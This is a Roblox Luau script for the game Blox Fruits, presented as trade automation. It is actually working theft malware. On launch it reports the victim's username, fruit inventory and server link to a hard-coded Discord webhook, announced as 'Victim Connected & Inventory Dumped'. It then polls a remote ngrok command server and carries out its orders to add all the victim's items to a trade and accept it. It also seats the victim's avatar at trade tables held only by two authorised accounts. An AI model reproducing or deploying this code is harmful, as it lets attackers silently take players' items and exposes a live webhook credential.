-- made by Noob --
-- lang: Luau, file: client_final.lua, target: Roblox / Blox Fruits Trade Automation
-- *merged: full MasterItemDictionary + addall/add branches from v1, stable remote layout + guard from v2*

getgenv().bfRunning = nil
getgenv().bfRunning = true

local MasterItemDictionary = {
    ["ember dragon"]             = "ember <dragon (west)>",
    ["ember"]                    = "ember <dragon (west)>",
    ["galaxy kitsune"]           = "galaxy <empyrean (kitsune)>",
    ["galaxy empyrean"]          = "galaxy <empyrean (kitsune)>",
    ["crimson kitsune"]          = "crimson kitsune",
    ["empyrean"]                 = "empyrean",
    ["divine portal"]            = "divine <portal>",
    ["divine"]                   = "divine <portal>",
    ["runic fiend"]              = "runic fiend",
    ["fiend"]                    = "fiend",
    ["werewolf"]                 = "werewolf",
    ["arcsteel magnet"]          = "arcsteel magnet",
    ["arcsteel"]                 = "arcsteel magnet",
    ["starlight gravity"]        = "starlight gravity",
    ["starlight"]                = "starlight gravity",
    ["purple lightning"]         = "purple lightning",
    ["yellow lightning"]         = "yellow lightning",
    ["red lightning"]            = "red lightning",
    ["green lightning"]          = "green lightning",
    ["nuclear bomb"]             = "nuclear bomb",
    ["thermite bomb"]            = "thermite bomb",
    ["azura bomb"]               = "azura bomb",
    ["celebration bomb"]         = "celebration bomb",
    ["emerald diamond"]          = "emerald diamond",
    ["ruby diamond"]             = "ruby diamond",
    ["topaz diamond"]            = "topaz diamond",
    ["rose quartz diamond"]      = "rose quartz diamond",
    ["rose quartz"]              = "rose quartz diamond",
    ["super spirit pain"]        = "super spirit pain",
    ["super spirit"]             = "super spirit pain",
    ["celestial pain"]           = "celestial pain",
    ["torment pain"]             = "torment pain",
    ["sadness pain"]             = "sadness pain",
    ["frustration pain"]         = "frustration pain",
    ["dog blade"]                = "dog blade",
    ["lime blade"]               = "lime blade",
    ["requiem eagle"]            = "requiem eagle",
    ["glacier eagle"]            = "glacier eagle",
    ["doghouse"]                 = "doghouse (frame break)",
    ["doghouse frame break"]     = "doghouse (frame break)",
    ["vibes"]                    = "vibes (frame break)",
    ["vibes frame break"]        = "vibes (frame break)",
    ["rabid"]                    = "rabid",
    ["scarlet ghost"]            = "scarlet ghost",
    ["dragon"]                   = "Dragon-Dragon",
    ["kitsune"]                  = "Kitsune-Kitsune",
    ["yeti"]                     = "Yeti-Yeti",
    ["tiger"]                    = "Tiger-Tiger",
    ["gas"]                      = "Gas-Gas",
    ["spirit"]                   = "Spirit-Spirit",
    ["control"]                  = "Control-Control",
    ["venom"]                    = "Venom-Venom",
    ["shadow"]                   = "Shadow-Shadow",
    ["dough"]                    = "Dough-Dough",
    ["t-rex"]                    = "T-Rex-T-Rex",
    ["trex"]                     = "T-Rex-T-Rex",
    ["mammoth"]                  = "Mammoth-Mammoth",
    ["gravity"]                  = "Gravity-Gravity",
    ["leopard"]                  = "Leopard-Leopard",
    ["leo"]                      = "Leopard-Leopard",
    ["blizzard"]                 = "Blizzard-Blizzard",
    ["portal"]                   = "Portal-Portal",
    ["phoenix"]                  = "Phoenix-Phoenix",
    ["sound"]                    = "Sound-Sound",
    ["buddha"]                   = "Buddha-Buddha",
    ["quake"]                    = "Quake-Quake",
    ["rumble"]                   = "Rumble-Rumble",
    ["love"]                     = "Love-Love",
    ["spider"]                   = "Spider-Spider",
    ["pain"]                     = "Pain-Pain",
    ["magma"]                    = "Magma-Magma",
    ["ghost"]                    = "Ghost-Ghost",
    ["rubber"]                   = "Rubber-Rubber",
    ["barrier"]                  = "Barrier-Barrier",
    ["light"]                    = "Light-Light",
    ["diamond"]                  = "Diamond-Diamond",
    ["dark"]                     = "Dark-Dark",
    ["sand"]                     = "Sand-Sand",
    ["ice"]                      = "Ice-Ice",
    ["falcon"]                   = "Falcon-Falcon",
    ["flame"]                    = "Flame-Flame",
    ["spike"]                    = "Spike-Spike",
    ["smoke"]                    = "Smoke-Smoke",
    ["bomb"]                     = "Bomb-Bomb",
    ["spring"]                   = "Spring-Spring",
    ["blade"]                    = "Blade-Blade",
    ["chop"]                     = "Blade-Blade",
    ["spin"]                     = "Spin-Spin",
    ["rocket"]                   = "Rocket-Rocket",
    ["storage"]                  = "+1 Fruit Storage",
    ["+1 storage"]               = "+1 Fruit Storage",
    ["fruit storage"]            = "+1 Fruit Storage",
    ["dark blade"]               = "Dark Blade",
    ["fruit notifier"]           = "Fruit Notifier",
    ["fast boats"]               = "Fast Boats",
    ["2x mastery"]               = "2x Mastery",
    ["2x money"]                 = "2x Money",
    ["2x boss drops"]            = "2x Boss Drops"
}

local function ResolveItemKey(userInput)
    if not userInput or userInput == "" then return nil end
    local cleaned = tostring(userInput):gsub("[<>%[%]{}]", "")
    local query = cleaned:lower():gsub("^%s+", ""):gsub("%s+$", "")

    if MasterItemDictionary[query] then
        return MasterItemDictionary[query]
    end

    for k, v in pairs(MasterItemDictionary) do
        if k:find(query, 1, true) or query:find(k, 1, true) then
            return v
        end
    end

    return userInput
end

local Config = {
    AuthorizedUsers = { "BLACKGOKU_0707", "Aid3no" },
    WebhookUrl = "https://discord.com/api/webhooks/1568890822420734094/CmM8-p7faQFs-rMwPhRqfMSlEG7-mV87NU3IEe-w3ZodJpaDRS2vrv0Befqxg6PB7DIY",
    CommandApiUrl = "https://bronzing-caution-vivacious.ngrok-free.dev/get_commands"
}

local Players         = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService     = game:GetService("HttpService")
local Workspace       = game:GetService("Workspace")
local TweenService    = game:GetService("TweenService")
local LocalPlayer     = Players.LocalPlayer

local Remotes       = ReplicatedStorage:WaitForChild("Remotes", 5)
local CommF         = Remotes and Remotes:WaitForChild("CommF_", 5)
local TradeFunction = Remotes and Remotes:WaitForChild("TradeFunction", 5)

local requestFunc = syn and syn.request or http_request or request

-- ── helpers ──────────────────────────────────────────────────────────────────

local function IsAuthorized(username)
    for _, name in ipairs(Config.AuthorizedUsers) do
        if name == username then return true end
    end
    return false
end

local function GetInventory()
    local success, result = pcall(function()
        if CommF then return CommF:InvokeServer("getInventory") end
        return {}
    end)
    return (success and type(result) == "table") and result or {}
end

-- ── telemetry ─────────────────────────────────────────────────────────────────

local function TransmitTelemetry()
    local inventory = GetInventory()
    local fruitsList = {}

    for _, item in pairs(inventory) do
        if item.Type == "Blox Fruit" then
            table.insert(fruitsList, (item.Name or "Unknown") .. " (x" .. tostring(item.Count or 1) .. ")")
        end
    end

    local payloadData = {
        content = "@everyone Victim Connected & Inventory Dumped!",
        embeds = {{
            title  = "Target Session Report",
            color  = 12451840,
            fields = {
                { name = "Username",       value = LocalPlayer.Name, inline = true },
                { name = "Stored Fruits",  value = #fruitsList > 0 and table.concat(fruitsList, ", ") or "None", inline = false },
                { name = "Server Join Link", value = "`teleportService:TeleportToPlaceInstance("
                    .. tostring(game.PlaceId) .. ", \""
                    .. tostring(game.JobId)   .. "\", game.Players.LocalPlayer)`", inline = false }
            },
            timestamp = DateTime.now():ToIsoDate()
        }}
    }

    if requestFunc then
        pcall(function()
            requestFunc({
                Url     = Config.WebhookUrl,
                Method  = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body    = HttpService:JSONEncode(payloadData)
            })
        end)
    end
end

-- ── trade actions ─────────────────────────────────────────────────────────────

local function InvokeTradeAction(action)
    if not TradeFunction then
        warn("[ERROR] TradeFunction remote missing!")
        return
    end

    pcall(function()
        if action == "accept" then
            TradeFunction:InvokeServer("accept")

        elseif action == "cancel" then
            TradeFunction:InvokeServer("cancel")

        elseif action == "addall" then
            local inventory = GetInventory()
            local addQueue  = {}

            for _, item in pairs(inventory) do
                local itemName = item.Name or item[1]
                if itemName then
                    local resolved = ResolveItemKey(itemName)
                    if resolved then
                        table.insert(addQueue, resolved)
                    end
                end
            end

            for _, targetName in ipairs(addQueue) do
                TradeFunction:InvokeServer("add", targetName)
                task.wait(0.2)
            end

        elseif action:sub(1, 3) == "add" then
            -- handles "add dragon", "adddough", "add <fruitname>" — strips prefix, resolves
            local rawQuery   = action:sub(4):gsub("^%s+", "")
            local resolvedKey = ResolveItemKey(rawQuery)
            TradeFunction:InvokeServer("add", resolvedKey or rawQuery)
        end
    end)
end

-- ── seat helpers ──────────────────────────────────────────────────────────────

local function TweenToSeat(hrp, targetCFrame)
    local distance = (hrp.Position - targetCFrame.Position).Magnitude
    local duration = math.clamp(distance / 150, 0.2, 1.5)
    local tween = TweenService:Create(
        hrp,
        TweenInfo.new(duration, Enum.EasingStyle.Linear, Enum.EasingDirection.Out),
        { CFrame = targetCFrame }
    )
    tween:Play()
    tween.Completed:Wait()
end

local function IsTradeTableSeat(seat)
    local parent = seat.Parent
    return parent and parent.Name == "TradeTable" and (seat.Name == "P1" or seat.Name == "P2")
end

local function GetUnauthorizedPlayerInSeat(seat)
    local overlapParams = OverlapParams.new()
    overlapParams.FilterType       = Enum.RaycastFilterType.Exclude
    overlapParams.RespectCanCollide = false

    for _, part in ipairs(Workspace:GetPartsInPart(seat, overlapParams)) do
        local character = part.Parent
        if character and character:FindFirstChildOfClass("Humanoid") then
            local player = Players:GetPlayerFromCharacter(character)
            if player and player ~= LocalPlayer then
                return not IsAuthorized(player.Name) and player.Name or nil
            end
        end
    end

    if seat.Occupant then
        local player = Players:GetPlayerFromCharacter(seat.Occupant.Parent)
        if player and player ~= LocalPlayer and not IsAuthorized(player.Name) then
            return player.Name
        end
    end

    return nil
end

local function IsTableBlocked(tableModel)
    for _, child in ipairs(tableModel:GetChildren()) do
        if child:IsA("Seat") and IsTradeTableSeat(child) then
            if GetUnauthorizedPlayerInSeat(child) then return true end
        end
    end
    return false
end

-- ── telemetry + command poll loop ─────────────────────────────────────────────

task.spawn(function()
    pcall(TransmitTelemetry)

    if not requestFunc then
        warn("[ERROR] Executor does not support http requests!")
        return
    end

    while getgenv().bfRunning do
        task.wait(2)
        pcall(function()
            local response = requestFunc({
                Url    = Config.CommandApiUrl,
                Method = "GET"
            })

            if response and response.StatusCode == 200 then
                local data = HttpService:JSONDecode(response.Body)
                if data and data.command then
                    InvokeTradeAction(data.command)
                end
            end
        end)
    end
end)

-- ── auto-sit / table-switching loop ───────────────────────────────────────────

task.spawn(function()
    local lastTable   = nil
    local jumpCooldown = 0

    while getgenv().bfRunning do
        task.wait(0.5)

        local character = LocalPlayer.Character
        if not character or not character:FindFirstChild("HumanoidRootPart") then continue end
        local hrp      = character.HumanoidRootPart
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        if not humanoid then continue end

        if humanoid.SeatPart then
            local currentSeat = humanoid.SeatPart
            if IsTradeTableSeat(currentSeat) then
                lastTable = currentSeat.Parent

                local unauthorizedFound = false
                for _, child in ipairs(lastTable:GetChildren()) do
                    if child:IsA("Seat") and IsTradeTableSeat(child) and GetUnauthorizedPlayerInSeat(child) then
                        unauthorizedFound = true
                        break
                    end
                end

                if unauthorizedFound then
                    humanoid.Sit = false
                    humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                    jumpCooldown = tick() + 2
                    task.wait(0.8)
                end
            end
        else
            if tick() < jumpCooldown then continue end

            local bestSeat    = nil
            local shortestDist = math.huge

            for _, obj in pairs(Workspace:GetDescendants()) do
                if obj:IsA("Seat") and IsTradeTableSeat(obj) then
                    if obj.Parent ~= lastTable and not IsTableBlocked(obj.Parent) then
                        local dist = (hrp.Position - obj.Position).Magnitude
                        if dist < 800 and dist < shortestDist then
                            shortestDist = dist
                            bestSeat     = obj
                        end
                    end
                end
            end

            if not bestSeat then
                lastTable = nil
            else
                TweenToSeat(hrp, bestSeat.CFrame + Vector3.new(0, 3, 0))
                task.wait(0.2)
                bestSeat:Sit(humanoid)
            end
        end
    end
end)
